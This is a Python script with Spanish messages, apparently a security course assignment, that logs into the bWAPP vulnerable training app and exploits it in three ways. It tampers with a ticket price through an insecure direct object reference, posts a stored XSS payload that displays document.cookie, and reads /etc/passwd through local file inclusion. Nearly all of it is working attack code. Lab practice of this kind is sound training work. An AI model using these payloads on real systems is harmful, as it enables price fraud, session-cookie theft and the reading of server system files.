import requests 
import argparse
from bs4 import BeautifulSoup
 
parser = argparse.ArgumentParser()
parser.add_argument('-t', '--target', type=str, help="Target IP")
args = parser.parse_args()


def get_html_title(req):
    
    soup = BeautifulSoup(req.text, 'html.parser')
    return soup.title.text 

def auth():
    
    session = requests.Session()
    data = {
        
        "login": "bee",
        "password":	"busg",
        "security_level":"0",
        "form":	"submit",
    }
    
    auth_dic = {
    "auth": False,
    "session": ""
    }

    try:
        target = args.target
        endpoint = "http://"+target+"/bWAPP/login.php"
        req = session.post(endpoint, data=data, allow_redirects=True)
        title = get_html_title(req)      
        if(title == "bWAPP - Portal"):
            auth_dic = {
                "auth": True,
                "session": session
        }
        
    except requests.exceptions.ConnectionError:
        print("[*] No se encuentra instancia de bWAPP en la IP indicada")
        exit()

    return auth_dic
    
def IDOR_scanner():

    session_info = auth()
    print("\n[+] Iniciando escaneo sobre la vulnerabilidad: Insecure DOR (Order Tickets)")
    

    session = session_info['session']
    target = args.target
    
    print("[+] El valor original del Ticket es de 15 EUR")
    print("[+] Es posible modiifcar el valor al que queramos y el servidor lo acepta")
    print("[+] Bajaremos el valor del ticket a 1 EUR")
    print("[+] Respuesta desde el servidor:\n")
    
    
    idor_vuln = {"ticket_quantity":"100","ticket_price":"1","action":"order"}
    endpoint = "http://"+target+"/bWAPP/insecure_direct_object_ref_2.php"
    req = session.post(endpoint, data=idor_vuln, allow_redirects=True)       
    soup = BeautifulSoup(req.text, 'html.parser')
    
    html_response = soup.find("div", {"id": "main"}).find_all("p")[-3]
    html_response2 = soup.find("div", {"id": "main"}).find_all("p")[-2]
    

    print(html_response)
    print(html_response2)
    print("\n[+] IDOR Scanner Finalizado")

    

def stored_XSS_scanner():
    session_info = auth()
    print("\n[+] Iniciando escaneo sobre la vulnerabilidad: XSS - Stored (Blog)")
    
    session = session_info['session']
    target = args.target
    
    print("[+] No se sanitizan los inputs y es posible agregar bloques de codigo javascript junto a un texto plano del blog")
    print("[+] Se usara obtendran las cookies con la siguiente payload")
    print("[+] Al ser una vulnerabilidad orientada al cliente, por favor revisar que la instancia de una nueva entrada en el blog con la payload este funcionando\n")
    
    # xss_vuln = {"entry":"%3Cscript%3"+"E%0D%0Aalert%28"+"document.cookie%29"+"%3B%0D%0A%3C%2"+"Fscript%3"+"E","blog":"submit","entry_add":""}
    xss_vuln = {"entry": '<script>alert(document.cookie)</script>',"blog":"submit","entry_add":""}
    
    endpoint = "http://"+target+"/bWAPP/xss_stored_1.php"
    req = session.post(endpoint, data=xss_vuln, allow_redirects=True)       
    soup = BeautifulSoup(req.text, 'html.parser')
    
    html_response = soup.find_all("table", {"id": "table_yellow"})
    
    print(html_response)
    print("\n[+] XSS Stored Scanner Finalizado")
        
        
        
def LFI_scanner():
    session_info = auth()
    print("\n[+] Iniciando escaneo sobre la vulnerabilidad: Remote & Local File Inclusion (RFI/LFI)")
    
    session = session_info['session']
    target = args.target
    
    print("[+] Endpoint original: bWAPP/rlfi.php?language=lang_en.php&action=go")
    print("[+] Obteniendo /etc/passwd, mediante el parametro ?language=")
    print("[+] Endpoint modificado: /bWAPP/rlfi.php?language=/etc/passwd")
    print("[+] Respuesta desde el servidor:\n")
    
    
    rfi_lfi_injection = "/etc/passwd"
    endpoint = "http://"+target+"/bWAPP/rlfi.php?language="+rfi_lfi_injection
    req = session.post(endpoint, allow_redirects=True)       
    soup = BeautifulSoup(req.text, 'html.parser')
    
    html_response = soup.find("div", {"id": "main"})
    print(html_response)
    print("\n[+] RFI/LFI Scanner Finalizado")  


if __name__ == "__main__":
    print("\n[+] Inicio de Scrip segunda evaluacion")
    
    if(args.target):
        if (auth()['auth'] == True):
            print("\n[++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++]")
            IDOR_scanner()
            print("\n[++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++]")
            stored_XSS_scanner()
            print("\n[++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++]")
            LFI_scanner()
            print("\n[++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++]")
        else:
            print("[*] Porfavor inicia sesion, no se pueden analizar las vulnerabilidades de IDOR - Stored XSS - LFI/RFI")
    else:
        print("[*] Error: Indicar IP de bWAPP")
